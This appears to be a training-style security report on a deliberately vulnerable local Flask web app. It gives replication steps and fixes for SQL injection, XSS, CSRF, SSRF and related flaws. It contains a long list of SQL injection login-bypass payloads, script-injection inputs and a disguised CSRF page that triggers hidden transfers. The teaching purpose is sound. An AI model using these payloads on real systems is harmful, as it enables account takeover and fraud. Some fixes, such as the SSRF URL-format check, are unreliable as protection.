# Hacker's Report: Breaking into the Client’s PWA

This document outlines the security vulnerabilities identified in the client’s Progressive Web App (PWA). It provides detailed replication steps, explanations of why each vulnerability exists, and recommendations for fixes. The testing methodologies used include **blackbox**, **whitebox**, and **greybox testing**, along with **Google Lighthouse** audits.

---

## **Objectives**
- Identify security weaknesses in the PWA.
- Simulate real-world attacks to demonstrate vulnerabilities.
- Provide actionable recommendations to secure the system.

---

## **Vulnerabilities and Replication Steps**

### **1. SQL Injection Demo**

#### **Description**
The login form allows SQL injection through both username and password fields, demonstrating multiple attack vectors.

#### **Steps to Replicate**

##### Method 1: Username Injection
1. Navigate to the Login Page: `http://127.0.0.1:5000/login`
2. Enter in the **Username** field:
   ```sql
   admin' OR '1'='1
   ```
3. Enter any password
4. Click Login

##### Method 2: Password Injection
1. Navigate to the Login Page: `http://127.0.0.1:5000/login`
2. Enter any username
3. Enter in the **Password** field:
   ```sql
   ' OR '1'='1--
   ```
4. Click Login

##### SQL Injection Payloads or 1=1

or 1=1--

or 1=1#

or 1=1/*

admin' --

admin' #

admin'/*

admin' or '1'='1

admin' or '1'='1'--

admin' or '1'='1'#

admin' or '1'='1'/*

admin'or 1=1 or ''='

admin' or 1=1

admin' or 1=1--

admin' or 1=1#

admin' or 1=1/*

admin') or ('1'='1

admin') or ('1'='1'--

admin') or ('1'='1'#

admin') or ('1'='1'/*

admin') or '1'='1

admin') or '1'='1'--

admin') or '1'='1'#

admin') or '1'='1'/*

1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055

admin" --

admin" #

admin"/*

admin" or "1"="1

admin" or "1"="1"--

admin" or "1"="1"#

admin" or "1"="1"/*

admin"or 1=1 or ""="

admin" or 1=1

admin" or 1=1--

admin" or 1=1#

admin" or 1=1/*

admin") or ("1"="1

admin") or ("1"="1"--

admin") or ("1"="1"#

admin") or ("1"="1"/*

admin") or "1"="1

admin") or "1"="1"--

admin") or "1"="1"#

admin") or "1"="1"/*

1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055



#### **Expected Result**
- Both methods will result in successful login
- The server will log the executed SQL query showing the injection

#### **Why This Happens**
- The application builds SQL queries by directly concatenating user input:
  ```python
  query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
  ```
- No input sanitization or parameter binding
- The `OR '1'='1'` makes the WHERE clause always true
- The `--` in the password method comments out the rest of the query

#### **Google Lighthouse Insights**
- Flagged missing `Content-Security-Policy` headers
- Highlighted potential for data exfiltration

#### **Recommendation**
- Use parameterized queries to prevent SQL injection:
  ```python
  c.execute("SELECT * FROM users WHERE username = ? AND password = ?", 
           (username, password))
  ```
- Implement proper input validation
- Use an ORM like SQLAlchemy
- Add proper error handling and logging
- Never concatenate raw user input into SQL queries

### **2. XSS (Cross-Site Scripting)**

#### **Description**
The search bar renders user input directly, allowing malicious scripts to execute.

#### **Steps to Replicate**
1. Navigate to the Search Page: `http://127.0.0.1:5000/search`
2. Enter the following in the search bar:
   ```html
   <script>alert('XSS Vulnerability!');</script>
   ```
3. Submit the form.

#### **Expected Result**
A browser popup displays the alert message "XSS Vulnerability!".

#### **Why This Happens**
- User input is rendered in the DOM without sanitization.

#### **Google Lighthouse Insights**
- Missing Content-Security-Policy headers flagged.
- Warned about the absence of X-XSS-Protection.

#### **Recommendation**
- Escape user input before rendering it:
   ```python
   from markupsafe import escape
   return f"Search results for: {escape(query)}"
   ```

### **3. CSRF (Cross-Site Request Forgery)**

#### **Description**
The transfer endpoint lacks CSRF protection, allowing unauthorized transactions when a user is authenticated.

#### **Test Environment Setup**
1. **Initial Setup**:
   ```bash
   # Create a directory for the malicious site
   mkdir csrf-attack
   cd csrf-attack
   ```

2. **Create the Malicious Site**:
   Create `evil.html`:
   ```html
   <!DOCTYPE html>
   <html>
   <head>
       <title>Win a Prize!</title>
       <style>
           body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
           button { padding: 15px 30px; font-size: 18px; background-color: #4CAF50; 
                   color: white; border: none; cursor: pointer; }
           button:hover { background-color: #45a049; }
       </style>
   </head>
   <body>
       <h1>🎉 Congratulations! You've Won! 🎉</h1>
       <h2>Click below to claim your $100 prize!</h2>
       <button onclick="document.getElementById('csrf-form').submit()">
           🎁 Claim Your Prize Now! 🎁
       </button>
       
       <!-- Hidden CSRF form -->
       <form id="csrf-form" action="http://localhost:5000/transfer" 
             method="POST" style="display: none;">
           <input type="hidden" name="to_user" value="admin">
           <input type="hidden" name="amount" value="100">
       </form>
   </body>
   </html>
   ```

#### **Testing Steps**

1. **Start the Main Application**:
   ```bash
   # Terminal 1 - Main application
   cd flask-pwa-security
   python app.py
   ```

2. **Start the Malicious Server**:
   ```bash
   # Terminal 2 - Attacker's server
   cd csrf-attack
   python -m http.server 8080
   ```

3. **Setup Test Accounts**:
   - Register two accounts:
     1. Username: `user`, Password: `password123`
     2. Username: `admin`, Password: `adminpass`
   - Each account starts with different balances:
     - user: $500
     - admin: $1000

4. **Test Normal Transfer**:
   1. Login as `user` at `http://localhost:5000/login`
   2. Go to `http://localhost:5000/transfer`
   3. Make a legitimate transfer:
      - To: admin
      - Amount: $10
   4. Verify balance changes correctly

5. **Test CSRF Attack**:
   1. Ensure you're still logged in as `user`
   2. Note your current balance
   3. In a new tab, visit `http://localhost:8080/evil.html`
   4. Click the "Claim Your Prize Now!" button
   5. Check your balance at `http://localhost:5000/transfer`
   6. You should see $100 transferred to admin without your consent

6. **Verify Attack Success**:
   - Check `/transfer` page for new balance
   - Login as admin to verify received amount
   - Check browser network tab for request details

#### **Testing Variations**

1. **Different Browsers**:
   - Test in Chrome, Firefox, and Edge
   - Each maintains separate cookie storage
   - Attack should work across all browsers

2. **Multiple Attacks**:
   - Try clicking multiple times
   - Verify each attempt processes if funds available
   - Check balance deduction accuracy

3. **Session Testing**:
   - Try after session timeout
   - Test with logged-out user
   - Verify attack fails without valid session

#### **Common Issues**

1. **Server Errors**:
   - 401 Unauthorized: Not logged in
   - 400 Bad Request: Invalid amount/user
   - 500 Server Error: Check app logs

2. **Troubleshooting**:
   - Verify both servers running (ports 5000 and 8080)
   - Check user logged in before testing
   - Ensure sufficient balance for transfer
   - Clear browser cache if needed

#### **Impact Analysis**
1. **Financial Impact**:
   - Unauthorized transfers possible
   - Multiple transfers can drain account
   - No confirmation required

2. **Security Implications**:
   - Exploits user's authenticated session
   - Works across different origins
   - No transaction verification needed

#### **Detection Methods**
1. Monitor for:
   - Unusual transfer patterns
   - Multiple rapid transfers
   - Transfers from unexpected origins

#### **Mitigation Testing**
After implementing fixes, verify that:
1. Requests with invalid CSRF tokens fail
2. Cross-origin requests are blocked
3. SameSite cookie attribute prevents attack
4. Origin/referer validation works

#### **Recommendation**
1. Implement CSRF tokens:
   ```python
   from flask_wtf.csrf import CSRFProtect
   csrf = CSRFProtect(app)
   ```

2. Add CSRF token to forms:
   ```html
   <form method="POST">
       {{ csrf_token() }}
       <!-- form fields -->
   </form>
   ```

3. Use SameSite cookie attribute:
   ```python
   app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
   ```

4. Validate origin/referer headers:
   ```python
   if request.headers.get('Origin') != 'http://yourdomain.com':
       abort(403)
   ```

5. Add transaction confirmation:
   ```python
   # Generate and verify one-time tokens for transfers
   @app.route('/confirm_transfer/<token>')
   def confirm_transfer(token):
       if verify_token(token):
           execute_transfer()
   ```

### **4. Insecure API Endpoint**

#### **Description**
The API accepts and stores malicious payloads without validation.

#### **Steps to Replicate**
1. Create an HTML form to simulate an API request:
   ```html
   <form method="POST" action="http://127.0.0.1:5000/api/data">
       <textarea name="data">{"data": "<script>alert('API Vulnerability!');</script>"}</textarea>
       <button type="submit">Send</button>
   </form>
   ```
2. Open the form in your browser and click Send.
3. Check the `data.json` file.

#### **Expected Result**
The malicious payload is stored unmodified:
   ```json
   {
       "data": "<script>alert('API Vulnerability!');</script>"
   }
   ```

#### **Why This Happens**
- The API does not validate or sanitize incoming JSON payloads.

#### **Google Lighthouse Insights**
- Missing security headers like Access-Control-Allow-Origin flagged.

#### **Recommendation**
- Validate and sanitize JSON payloads before processing:
   ```python
   if not isinstance(request.json['data'], str):
       return jsonify({"error": "Invalid data format"}), 400
   ```

### **5. Broken Access Control**

#### **Description**
The application exposes user data through predictable IDs without proper authorization checks.

#### **Steps to Replicate**
1. Access the endpoint directly: `http://localhost:5000/user/1`
2. Try different IDs: `/user/2`, `/user/3`, etc.
3. Note that no authentication is required

#### **Expected Result**
- Direct access to user data
- JSON response with user details
- No authorization checks performed

#### **Why This Happens**
- No authentication check before accessing data
- Direct exposure of database IDs
- Missing access control checks

#### **Recommendation**
- Implement proper authentication
- Use indirect references
- Add authorization checks
- Implement role-based access control

### **6. Weak Password Storage**

#### **Description**
Passwords are stored in plaintext, exposing them to anyone with access to the server.

#### **Steps to Replicate**
1. Navigate to the Registration Page: `http://127.0.0.1:5000/register`
2. Create a new user:
   - Username: `testuser`
   - Password: `mypassword`
3. Compare storage methods:
   
   a. View plaintext passwords in `users.json`:
   ```json
   {
       "testuser": "mypassword"
   }
   ```
   
   b. View hashed passwords in SQLite using check_db.py:
   ```bash
   python check_db.py
   ```
   Output shows secure vs insecure storage:
   ```
   Users in database:
   ID: 1, Username: testuser, Password: scrypt:32768:8:1$...[hashed]...
   ```

#### **Why This Happens**
- Passwords are saved directly without hashing in users.json
- SQLite database uses proper password hashing
- This dual storage demonstrates the contrast between secure and insecure practices

#### **Security Impact**
- users.json: Passwords are immediately readable by anyone with file access
- users.db: Passwords are properly hashed and protected

#### **Google Lighthouse Insights**
- Flagged unencrypted HTTP connections, highlighting potential risks of transmitting plaintext passwords.

#### **Recommendation**
- Hash passwords before storing them:
   ```python
   from werkzeug.security import generate_password_hash
   hashed_password = generate_password_hash(password)
   ```

### **7. Stored XSS**

#### **Description**
The application stores user input without sanitization, allowing malicious scripts to be executed.

#### **Steps to Replicate**
1. Navigate to the Comment Section: `http://127.0.0.1:5000/comments`
2. Enter the following in the comment field:
   ```html
   <script>alert('XSS Vulnerability!');</script>
   ```
3. Submit the form.

#### **Expected Result**
A browser popup displays the alert message "XSS Vulnerability!".

#### **Why This Happens**
- User input is stored without sanitization.

#### **Google Lighthouse Insights**
- Missing Content-Security-Policy headers flagged.
- Warned about the absence of X-XSS-Protection.

#### **Recommendation**
- Escape user input before storing it:
   ```python
   from markupsafe import escape
   return f"Comment: {escape(comment)}"
   ```

### **8. Security Misconfiguration**

#### **Description**
The application lacks critical security headers, making it vulnerable to various attacks.

#### **Steps to Check**
1. Use browser developer tools
2. Examine response headers
3. Note missing or misconfigured headers:
   - No Content-Security-Policy
   - Weak X-Frame-Options
   - Missing HSTS

#### **Impact**
- Clickjacking vulnerability
- XSS exploitation easier
- Man-in-the-middle attacks possible

#### **Recommendation**
```python
@app.after_request
def add_security_headers(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    response.headers['X-Frame-Options'] = 'SAMEORIGIN'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000'
    return response
```

### **9. Insecure Design (A04)**

#### **Description**
The application's design allows for predictable resource locations and weak session management.

#### **Steps to Replicate**
1. Access the endpoint directly: `http://localhost:5000/user/1`
2. Try different IDs: `/user/2`, `/user/3`, etc.
3. Note that no authentication is required

#### **Expected Result**
- Direct access to user data
- JSON response with user details
- No authorization checks performed

#### **Why This Happens**
- No authentication check before accessing data
- Direct exposure of database IDs
- Missing access control checks

#### **Recommendation**
- Implement proper authentication
- Use indirect references
- Add authorization checks
- Implement role-based access control

### **10. Vulnerable Components (A06)**

#### **Description**
The application uses outdated dependencies with known vulnerabilities.

#### **Steps to Check**
1. Use dependency scanning tools
2. Examine the application's dependencies
3. Note outdated or vulnerable components:
   - Outdated Flask version
   - Vulnerable Werkzeug version

#### **Impact**
- Potential for exploitation of known vulnerabilities
- Increased risk of security breaches

#### **Recommendation**
- Update dependencies to the latest versions:
   ```bash
   pip install --upgrade flask
   pip install --upgrade werkzeug
   ```

### **11. Security Logging Failures (A09)**

#### **Description**
The application fails to properly log security events, making it difficult to detect and respond to security incidents.

#### **Demo Credentials**
```
Username: admin
Password: admin123
```
This is a separate demo endpoint using hardcoded credentials specifically to demonstrate logging vulnerabilities. The main user authentication system uses the database and is demonstrated in other vulnerabilities.

#### **Test Scenario 1: Sensitive Data Exposure in Logs**

1. Open a terminal and start monitoring the application logs:
   ```bash
   type app.log
   ```

2. Go to the admin login form on the home page (under "11. Security Logging Failures")
3. Submit these credentials:
   - Username: `admin`
   - Password: `admin123`
4. Check the logs again:
   ```bash
   type app.log
   ```
   You should see sensitive information exposed:
   ```
   [ADMIN LOGIN] Attempt with credentials - Username: admin, Password: admin123
   ```

**Security Impact**: Passwords and sensitive data are logged in plaintext, risking exposure through log files.

#### **Test Scenario 2: Missing Critical Event Logging**

1. Try these login attempts:
   - Correct credentials (admin/admin123)
   - Wrong password (admin/wrongpass)
   - Wrong username (notadmin/admin123)
   - SQL injection attempt (admin' OR '1'='1)

2. Check the logs. Notice that many critical security events are not logged:
   - No IP addresses logged
   - No timestamps on events
   - No session IDs tracked
   - No user agent information
   - No success/failure status
   - No rate limiting information

**Security Impact**: Inability to detect and investigate security incidents.

#### **Test Scenario 3: Insufficient Logging Detail**

1. Try to perform a password reset for any user
2. Check the logs and notice:
   - No record of who initiated the reset
   - No timestamp of the action
   - No success/failure status

**Security Impact**: Forensic investigation becomes impossible due to missing crucial details.

#### **Test Scenario 4: No Log Protection**

1. Locate the log file in the application directory
2. Notice that:
   - Logs are stored without encryption
   - No log rotation implemented
   - No access controls on log files
   - No backup strategy

**Security Impact**: Log tampering and deletion go undetected.

#### **Test Scenario 5: Missing Audit Trail**

1. As an admin user:
   - Create a new user account
   - Modify user permissions
   - Delete a user

2. Try to reconstruct the sequence of events from logs
3. Notice that it's impossible to:
   - Track who made what changes
   - Determine the timing of changes
   - See the previous vs new values

**Security Impact**: No accountability for administrative actions.

#### **Proper Implementation Would Include**

1. **Structured Logging**:
   ```python
   logging.info({
       "event": "login_attempt",
       "username": username,
       "ip": request.remote_addr,
       "user_agent": request.user_agent.string,
       "timestamp": datetime.utcnow().isoformat(),
       "success": success
   })
   ```

2. **Critical Events to Log**:
   - Authentication events (success/failure)
   - Authorization failures
   - Input validation failures
   - Application errors
   - Security configuration changes
   - Data access and modification

3. **Log Protection**:
   - Implement log rotation
   - Use append-only logs
   - Store logs securely
   - Regular log backups
   - Log integrity monitoring

4. **Never Log**:
   - Passwords (plain text or hashed)
   - Session tokens
   - API keys
   - Sensitive personal data
   - Banking/financial data

#### **Mitigation Steps**

1. Implement structured logging with proper formatting:
   ```python
   logging.basicConfig(
       level=logging.INFO,
       format='%(asctime)s - %(levelname)s - %(client_ip)s - %(message)s',
       datefmt='%Y-%m-%d %H:%M:%S'
   )
   ```

2. Use logging levels appropriately:
   ```python
   logging.info("User logged in successfully")  # Normal operations
   logging.warning("Failed login attempt")      # Potential security events
   logging.error("Authorization failure")       # Security incidents
   ```

3. Include contextual information:
   ```python
   extra = {
       'client_ip': request.remote_addr,
       'user_id': current_user.id,
       'action': 'password_change'
   }
   logger.info("Password changed", extra=extra)
   ```

4. Implement secure log handling:
   ```python
   from logging.handlers import RotatingFileHandler
   
   handler = RotatingFileHandler(
       'app.log',
       maxBytes=10000000,  # 10MB
       backupCount=5
   )
   ```

#### **Testing Tools**

- Log analysis tools (e.g., ELK Stack)
- Log monitoring systems
- SIEM solutions
- File integrity monitoring tools

### **12. SSRF Vulnerability (A10)**

#### **Description**
The application allows for Server-Side Request Forgery (SSRF) attacks, enabling an attacker to make unauthorized requests.

#### **Steps to Replicate**
1. Navigate to the SSRF Endpoint: `http://127.0.0.1:5000/ssrf`
2. Enter a URL in the input field:
   ```html
   http://localhost:5000/admin
   ```
3. Submit the form.

#### **Expected Result**
The application makes a request to the specified URL, potentially allowing access to sensitive data or systems.

#### **Why This Happens**
- The application does not validate or sanitize the input URL.

#### **Recommendation**
- Validate and sanitize the input URL:
   ```python
   from urllib.parse import urlparse
   
   def is_valid_url(url):
       try:
           result = urlparse(url)
           return all([result.scheme, result.netloc])
       except ValueError:
           return False
   ```

---

## **Summary of Tools and Testing Methodologies**

### **1. Testing Methodologies**
- **Blackbox Testing**:
  Simulated attacks without access to source code, using form inputs and browser interactions.
- **Whitebox Testing**:
  Reviewed the source code to identify vulnerabilities like raw SQL queries and unsanitized inputs.
- **Greybox Testing**:
  Combined knowledge of the codebase with manual tests to refine attacks.

### **2. Tools Used**
- **Google Lighthouse**:
  Identified missing security headers, outdated libraries, and unencrypted HTTP connections.
- **Browser Developer Tools**:
  Inspected requests, cookies, and DOM behavior to uncover vulnerabilities.

---

## **Recommendations**

### **Critical Fixes:**
- Use parameterised queries to prevent SQL Injection.
- Hash passwords before storing them.
- Sanitize user input to prevent XSS.

### **Intermediate Fixes:**
- Add Content-Security-Policy and other headers to restrict script execution.
- Enforce HTTPS using Flask-Talisman.

### **Ongoing Practices:**
- Regularly audit dependencies for vulnerabilities.
- Perform routine penetration testing to ensure continued security.
